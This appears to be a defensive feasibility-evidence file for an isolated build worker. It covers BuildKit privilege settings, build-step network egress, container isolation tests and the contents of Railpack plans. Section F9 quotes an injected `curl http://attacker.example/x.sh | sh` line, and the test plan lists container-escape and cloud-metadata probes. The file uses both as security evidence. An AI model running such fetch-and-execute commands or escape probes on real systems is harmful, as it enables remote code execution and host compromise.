# SZ-12: isolated build worker feasibility evidence

Companion to `docs/superpowers/specs/2026-10-21-sz12-isolated-build-worker-rfc.md`.
This file records what was **measured** while preparing the RFC, on which
machine, with which exact commands, and what each result does and does not
prove. Nothing here was run against the customer's VPS, a production host, or
any StageZero deployment. All containers, builders, networks, and images created
for these measurements were removed afterwards.

Railpack version under test: **0.37.0** (`/tmp/opencode/railpack/bin/railpack`),
matching the pin in `api/jobs/deploy.go` and the API Dockerfile.

## Measurement environment

| Property | Value |
| --- | --- |
| OS | Fedora Linux 44, x86_64 |
| Docker Engine | 29.9.1, **rootful** (`DockerRootDir=/var/lib/docker`), `overlayfs`, `seccomp=profile=builtin`, `cgroupns` |
| buildx | v0.35.0-desktop.2 |
| Operator identity | uid 1000, member of group `docker`, `CapEff=0000000000000000` (no capabilities) |
| CPU / RAM / free disk | 8 cores / 3.7 GB RAM / 32 GB free on `/` |
| User namespaces | available (`unshare -Ur id` → `uid=0(root)` inside a new user namespace); `user.max_user_namespaces=14783` |

This machine is **itself an unprivileged container** (`context=unconfined_u`).
That is the single most important limitation of this file: results that depend
on mounting or nesting kernel objects may fail here and succeed on a dedicated
virtual machine, or vice versa. Every result below is labelled accordingly.

## F1 — the stock BuildKit Docker driver creates a *privileged* builder

```
docker buildx create --driver docker-container --use --name sz12-probe --bootstrap
docker inspect buildx_buildkit_sz12-probe0 --format '...'
```

| Field | Value |
| --- | --- |
| `HostConfig.Privileged` | **`true`** |
| `HostConfig.CapAdd` / `CapDrop` | `[]` / `[]` |
| `HostConfig.SecurityOpt` | `[label=disable]` |
| `HostConfig.NetworkMode` | `bridge` |
| `HostConfig.IpcMode` | `private` |
| `HostConfig.RestartPolicy` | `unless-stopped` |
| `HostConfig.Memory` / `PidsLimit` / `ReadonlyRootfs` | `0` / unset / `false` |
| Mounts | one volume only: `buildx_buildkit_sz12-probe0_state` → `/var/lib/buildkit` |
| `/var/run/docker.sock` | **not mounted into the builder** |

`docker buildx create --help` exposes only `--driver`, `--driver-opt`,
`--buildkitd-config`, `--buildkitd-flags`, `--platform`, `--node`, `--append`,
`--leave`, `--bootstrap`, `--timeout`. There is **no** knob for
`--cap-drop`, `--security-opt`, `--read-only`, `--pids-limit`, `--memory` or
`--user` on the container the driver creates.

**Proves:** the Revision 2 claim that the per-job builder container runs
"not privileged, `--cap-drop ALL`, `--security-opt no-new-privileges`" is
**not achievable with the stock `docker-container` driver**. Any RFC that
repeats it is wrong. It also proves the builder container does **not** receive
the host Docker socket, so a build step cannot drive the worker host's
container runtime directly.

**Does not prove:** what a hostile build step can reach inside a privileged
builder (i.e. whether a step that breaks out of its own container obtains
host root). That must be tested on the worker host (FT-3), not inferred from
the container's `Privileged` flag alone.

## F2 — build steps executed through the stock driver have network egress

```
docker buildx build --builder sz12-probe --build-arg BUILDKIT_SYNTAX=docker/dockerfile:1 \
  -f ctx/Dockerfile --output type=oci,dest=out2.tar --progress plain ctx
# FROM alpine:latest ; RUN echo ... && wget -q -T 8 -O /tmp/x https://example.com/ && echo NET-OK
```

Result: `#7 [2/2] RUN …` → **`NET-OK`**, step `DONE 0.2s`; OCI archive written
(3,859,456 bytes).

**Proves:** with the default `bridge` network the builder uses, a build step
reaches the public internet. Egress therefore has to be enforced by the
worker's network layer, not by the build environment (a repository can set
`HTTP_PROXY`, `npm` `proxy=`, `pip` `proxy=`, `cargo` `http.proxy`, a custom
registry, and so on — none of which a host-application allowlist can stop).

**Does not prove:** behaviour under a deny-by-default firewall; that is FT-4.

## F3 — rootless BuildKit starts, resolves and pulls; the build *step* needs a real VM

```
docker run -d --name sz12-bk --security-opt seccomp=unconfined --security-opt apparmor=unconfined \
  -p 127.0.0.1:11234:1234 moby/buildkit:rootless --addr tcp://0.0.0.0:1234
```

| Field | Value |
| --- | --- |
| Image entrypoint / user | `rootlesskit buildkitd` / `1000:1000` |
| `HostConfig.Privileged` | **`false`** |
| `HostConfig.SecurityOpt` | `[seccomp=unconfined apparmor=unconfined]` (required by rootlesskit) |
| `HostConfig.NetworkMode` | `bridge` |
| Mounts | one volume: worker state → `/home/user/.local/share/buildkit` |

Daemon log (verbatim, trimmed):

```
level=info msg="auto snapshotter: using overlayfs"
level=info msg="found worker \"pvuskqeg8dakh5v9daro4jhu0\"", labels=map[org.mobyproject.buildkit.worker.executor:oci
  org.mobyproject.buildkit.worker.network:host org.mobyproject.buildkit.worker.oci.process-mode:sandbox
  org.mobyproject.buildkit.worker.snapshotter:overlayfs], platforms=[linux/amd64 linux/amd64/v2 linux/amd64/v3 linux/386]"
level=warning msg="TLS is not enabled for tcp://0.0.0.0:1234. enabling mutual TLS authentication is highly recommended"
```

A build through it resolved and pulled `alpine:latest` (steps 1–4 succeeded) and
then failed at the first `RUN`:

```
#5 [2/2] RUN wget -q -T 8 -O /tmp/x https://example.com/ && echo NET-OK || echo NET-FAIL
#5 0.035 runc run failed: unable to start container process: error during container init:
      error mounting "proc" to rootfs at "/proc": mount src=proc, dst=/proc, ...: operation not permitted
```

**Proves:** a **rootless** BuildKit daemon can be started without `--privileged`,
registers an OCI worker, and executes the pull/resolve phases. The daemon
advertises `worker.network: host`, i.e. **build steps share the daemon's network
namespace** — per-step network namespacing is not provided by this engine.

**Does not prove:** that a `RUN` step can execute. The failure is a nested
container artefact of this machine (`mount proc` inside a nested user namespace
is refused here); it is *not* evidence about a dedicated worker VM. Validating
the run path on a real VM is **FT-2**, and it is a release blocker for the
rootless engine.

**Does not prove:** that `seccomp=unconfined` is acceptable in production; the
daemon refused to start without it in this configuration, and the RFC must
record that the rootless engine runs with a weakened seccomp profile unless
FT-2 finds a working alternative.

## F4 — the Railpack frontend is selected through a build argument, not a flag

`docker buildx build --frontend …` does not exist (`unknown flag: --frontend`).
The pinned frontend is selected exactly the way StageZero does it today:

```
docker buildx build --builder sz12-probe \
  --build-arg BUILDKIT_SYNTAX=ghcr.io/railwayapp/railpack-frontend:v0.37.0 \
  -f railpack-plan.json --output type=docker,dest=artifact.tar <context>
```

This is the flow the RFC must preserve; the worker uses the identical
invocation, so the pinned frontend is a compatibility constant of the worker
contract.

## F5 — container network isolation (13 cases, all executed)

Two user-defined bridges `sz12-net-a` (172.22.0.0/16) and `sz12-net-b`
(172.23.0.0/16); two server containers, each published **only** to host
loopback (`-p 127.0.0.1:1918x:9184`); clients with `ncat`.

| Case | From | Target | Result | Evidence |
| --- | --- | --- | --- | --- |
| A | container on net-a | `172.22.0.2:9184` (peer container IP) | **SUCCESS** | `Ncat: Connected to 172.22.0.2:9184.` / 5 bytes round-tripped / `EXIT=0` |
| B | container on net-a | `172.22.0.1:19184` (own gateway, published port) | FAILURE | `Ncat: Connection refused.` |
| C | container on net-a | `172.22.0.1:9184` (own gateway, container port) | FAILURE | `Ncat: Connection refused.` |
| D | container on net-b | `172.22.0.2:9184` (peer on net-a) | FAILURE | `Ncat: TIMEOUT.` (dropped in transit) |
| E1 | container on net-b | `172.23.0.1:19184` (own gateway) | FAILURE | `Ncat: Connection refused.` |
| E2 | container on net-b | `172.22.0.1:19184` (net-a gateway) | FAILURE | `Ncat: Connection refused.` |
| F | **host** | `127.0.0.1:19184` | SUCCESS | `Ncat: Connected to 127.0.0.1:19184.` |
| G | **host** | `172.22.0.2:9184` (container IP) | SUCCESS | host has a route to the bridge |
| H1 | container on net-a | `172.22.0.1:19185` (net-b's published port) | FAILURE | `Connection refused` |
| H2 | container on net-a | `172.23.0.2:9184` (peer on net-b) | FAILURE | `Ncat: TIMEOUT.` |
| H3 | container on net-b | `172.23.0.2:9184` (peer on net-b) | SUCCESS | same-network peers reach container IPs directly |
| H4 | container on net-b | `172.23.0.1:19185` (own gateway) | FAILURE | `Connection refused` |
| H5 | container on net-a | `172.23.0.1:19185` (cross-network gateway) | FAILURE | `Connection refused` |

Host-side `ss -ltnp` showed listeners only on `127.0.0.1:19184` and
`127.0.0.1:19185` — nothing on either bridge gateway address.

**Proves (three design facts):**

1. Publishing a container port to `127.0.0.1` **does not** restrict
   container-to-container access on the same network (A, H3). The current
   monitoring agent, which listens on the shared `stagezero` network and
   publishes only to loopback (`api/monitoring/agent.go:216`), **is reachable
   by every application container on that network** at its container IP.
2. Traffic between two user-defined networks is **dropped** (D, H2). Moving the
   agent to its own network is therefore the effective control; changing the
   publish binding is not.
3. A loopback-published port is unreachable **from any container** (B, C, E1,
   E2, H1, H4, H5), so the API's SSH tunnel to `127.0.0.1:<agentPort>` keeps
   working while the agent becomes unreachable from application containers.
   The host itself always has a path to container ports (G) and is inside the
   trust boundary.

**Does not prove:** `--network host` behaviour, UDP, IPv6, or `icc=false`; and
the cross-network drop was inferred from the timeout/refused split, not from
reading the host's `iptables` rules (no root in this environment).

## F6 — Railpack 0.37.0 plan corpus (nine providers)

Fixtures for node/bun, python, go, ruby, php, elixir, rust, java and dotnet
were prepared with `railpack prepare . --plan-out … --info-out …`; all nine
succeeded. Detected providers: `node, python, golang, ruby, php, Elixir, rust,
java, Dotnet`.

Observed plan key paths (the union across all nine plans — the source of the
structural allowlist in the RFC):

```
/$schema
/caches/<name>/{directory,type}          type ∈ {shared, locked}
/deploy/base/{image,step}
/deploy/inputs[]/{include,exclude,step}
/deploy/startCommand
/deploy/variables/{...}
/secrets
/steps[]/{name,assets,commands,inputs,caches,secrets,variables}
/steps[]/commands[]/{cmd,customName,dest,image,mode,name,path,src}
/steps[]/inputs[]/{include,exclude,image,local,step}
```

Searched for and **not present in any of the nine plans** (0 occurrences):
`mount`, `privileged`, `network`, `entitlement`, `/var/run`, `ssh`, `--cap`.

Images referenced by plans: `ghcr.io/railwayapp/railpack-builder:mise-2026.8.6`,
`ghcr.io/railwayapp/railpack-runtime:mise-2026.8.6`, and — for the PHP
provider — two **third-party, mutable** references: `composer:latest` and
`dunglas/frankenphp:php8.2.34-trixie`.

Cache directories observed: `/root/.bun/install/cache`, `/root/.cache/go-build`,
`/root/.cargo/{git,registry}`, `/opt/pip-cache`, `/opt/cache/composer`,
`/var/cache/apt`, `/var/lib/apt/lists`, `/root/.nuget/packages`, plus the
relative `target` and `.m2/repository`.

Plan-level `secrets` contains **variable names only**; no values are embedded
in the plan or the info file. Build/install steps carry `secrets: ["*"]`.
`deploy.inputs` copies `.` (and `/root/.cache` for node) into the runtime
image, so anything committed to the repository — including a `.env` file —
reaches the runtime container.

All observed commands are generated by Railpack, not by the repository:
`mise install`, `bun install --frozen-lockfile`, `bun run build`,
`pip install -r requirements.txt`, `python -m venv`, `go mod download`,
`go build`, `bundle install`, `gem install -N bundler`,
`composer install --optimize-autoloader --no-scripts --no-interaction`,
`cargo build --release`, `mix local.hex --force`, `mix deps.get --only prod`,
`mix release`, `dotnet restore`, `dotnet publish`, `mvn … clean dependency:…`,
`sh -c 'apt-get update && apt-get install -y …'`.

## F7 — preparation needs no egress, and does not run repository scripts

With an HTTP proxy pointed at a closed port, `railpack prepare` still succeeded
for node, python, go, ruby and java, resolving toolchain versions from the
generated mise configuration (bun 1.4.2, python 3.13.16, go 1.23.12,
ruby 3.4.11, java 21.0.2 + maven 3.10.0). A node fixture with `preinstall` and
`postinstall` scripts ran neither.

**Proves:** the *analysis* stage can be performed with **no network egress at
all**, and preparation does not execute repository lifecycle scripts.

**Does not prove:** the same for elixir, php, rust and dotnet (not separately
re-tested), and not that the *build* stage is egress-free — it obviously is
not (F2).

## F8 — build consumption, and a DNS lesson, on a real Railpack build

Measured with the pinned frontend `ghcr.io/railwayapp/railpack-frontend:v0.37.0`
(`--build-arg BUILDKIT_SYNTAX=…`, the same mechanism as `api/jobs/deploy.go`)
against the node fixture on this machine.

The build **failed**, and the failure is the useful part:

```
mise ERROR Failed to install core:bun@1.4.2
mise ERROR dns error: failed to lookup address information: Try again
```

Cause: this machine's resolver does not answer for `mise.jdx.dev`
(`nslookup mise.jdx.dev` → “No answer”), while `example.com` resolves and
fetches normally. The failure is at `mise install` — the toolchain
distribution step, **not** the package registry.

Consumption before the failure: the BuildKit state directory reached
**1.7 GB** for a fixture with no dependencies; the `railpack-builder` base image
is 239 MB compressed.

**Proves:** a dependency-installing build needs egress to *toolchain
distribution* hosts (`mise.jdx.dev` and the toolchain's own download hosts), not
only to language package registries. An egress allowlist built from package
registries alone will break real builds.

**Does not prove:** the size of a successful build's output. The full artifact
size could not be measured on this machine (the hosted SZ-09 Lite run built the
`centrys-labs/gitway` fixture successfully in 51 s on a 4-vCPU/15 GB runner, so
the path works; the byte size must be measured on a worker VM → FT-11).

## F9 — repository content controls the Railpack plan

A fixture containing a `railpack.json` (Railpack's own per-project config
file, default name per `railpack prepare --help`) was prepared with the pinned
binary. The resulting plan contained, verbatim:

```
/steps[2]/commands[0]/cmd: sh -c 'curl http://attacker.example/x.sh | sh'
deploy.startCommand:     sh -c 'curl http://attacker.example/x.sh | sh'
deploy.base:             {'step': 'packages:apt:runtime'}
```

Two arbitrary shell strings were injected into the plan from repository
content. The same file also changed the **toolchain** (`node = 18.20.8`
instead of the detected version), the **package manager** (`npm install`
instead of `bun install --frozen-lockfile`), the **base image**
(`packages:apt:runtime`), and the **cache set** (`/root/.npm` added,
`apt`/`apt-lists` switched to `locked`).

**Proves:** the Railpack plan is a **repository-controlled document**. It is
not a trusted, railpack-authored description of a safe build. Any design that
treats "the plan only contains railpack-generated commands" as a safety
property is wrong. The plan may only be used as a *control object* (images,
structure, secrets, inputs); the security boundary has to be the sandbox.

**Does not prove:** which specific keys a malicious repository can reach. The
observed surface is the command list, the start command, packages, the base
image and the cache set; the RFC's plan policy therefore validates by
**structural allowlist** and rejects unknown keys rather than trying to
enumerate attacker-reachable fields.

## What this file proves, in one paragraph

The Stock Docker BuildKit driver cannot be hardened (F1), rootless BuildKit is
promising but unproven for build steps on this machine (F3), build steps have
egress unless the network stops them (F2), the Railpack plan shape is knowable
and constrainable (F6), preparation needs no egress (F7), and the monitoring
agent's current placement is genuinely reachable from application containers
(F5). Everything else in the RFC is either an explicitly-labelled design
intent or a gate in the feasibility plan below.

## Feasibility test plan (to be executed on real worker hosts)

These are the gates that turn the RFC's intent into verified guarantees. Each
has an explicit pass criterion. FT-2, FT-3 and FT-4 are release blockers for
Phase 1.

| ID | Test | Pass criterion |
| --- | --- | --- |
| FT-1 | Boot a worker from a clean image; supervisor starts; janitor removes leftovers from a previous run | No orphaned builders, containers, or files after 3 forced kills; worker reaches `ready` in < 60 s |
| FT-2 | Rootless BuildKit executes a `RUN` step on a **virtual machine** (not a nested container) | A `RUN` step with `--security-opt seccomp=unconfined` executes; record whether a stricter profile is possible |
| FT-3 | Hostile build step attempts to escape: read `/proc/1/environ`, mount the host filesystem, reach the Docker socket, `nsenter` into the host | The step cannot reach the host's container runtime or the control plane; the worker host is rebuildable afterwards |
| FT-4 | Deny-by-default egress: worker may reach only the gateway and the allowlisted registries; everything else (private ranges, link-local, metadata, IPv6, DNS rebinding, proxy env vars) is refused | All forbidden probes fail closed; the build still succeeds for the nine-provider corpus |
| FT-5 | Metadata and control-plane probes from inside a build step (`169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`, the API host, the Postgres host, the gateway's other ports) | Every probe refused; no DNS answer for the API hostname from the worker |
| FT-6 | Lease semantics: kill the worker mid-build; a second worker claims the job; the first worker returns | The stale worker's writes are rejected (fence), the job completes exactly once, and no duplicate image is deployed |
| FT-7 | Cancellation: cancel while the build runs; also cancel after the build but before upload | The build stops within 10 s; no artifact is accepted; the workdir is wiped; the deployment ends in a terminal state exactly once |
| FT-8 | Artifact integrity: corrupt the archive in transit, truncate it, replay an old fence's upload | All three are detected and rejected; the job fails with a distinct error code; no partial artifact remains |
| FT-9 | Secret exposure: a build prints a string that equals a runtime env secret; inspect worker events, API logs, `deployment_logs`, the artifact, and the diagnostics bundle | The value never appears in any of those surfaces (redaction is applied API-side before storage) |
| FT-10 | Provider regression: run the nine-provider corpus end to end through the worker | All nine prepare and build successfully; the corpus is pinned in CI and re-derived on every Railpack version bump |
| FT-11 | Measure a successful build end to end on a worker VM: BuildKit state peak, artifact size, wall time, memory, CPU | Peak BuildKit state ≤ 8 GiB, artifact ≤ 2 GiB, build ≤ 30 min for the corpus, RSS ≤ 8 GiB; `--output type=docker,dest=-` streams to the upload without a local 2 GiB file |
| FT-12 | Verify the recommended W1 configuration: native rootless `buildkitd`, **no Docker daemon on the host** | A `RUN` step executes; `docker` is not installed; no host socket exists; build steps cannot see the host filesystem — otherwise fall back to W2 and record the accepted risk |
| FT-13 | Verify the "API relays the tarball" acquisition mode | The worker's egress set is exactly one destination (the gateway); a corrupted relayed tarball is detected by digest **before** extraction |
